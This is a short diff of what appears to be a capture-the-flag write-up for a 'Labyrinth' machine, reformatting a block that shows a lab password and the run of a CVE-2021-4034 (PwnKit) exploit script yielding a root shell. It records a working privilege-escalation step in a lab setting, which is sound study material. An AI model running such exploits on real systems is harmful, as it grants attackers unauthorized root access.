@@ -287,11 +287,14 @@ password:  Knossos
 
 #  Whoa, that's a pretty obvious privesc
 
-```entrance@Labyrinth:~$ python3 CVE-2021-4034.py 
-[+] Creating shared library for exploit code.
-[+] Calling execve()
-# whoami
-root```
+>entrance@Labyrinth:~$ python3 CVE-2021-4034.py
+>
+>[+] Creating shared library for exploit code.
+>[+] Calling execve()
+>
+># whoami
+>
+>root
 
 ## THAT WAS EASY!!
 
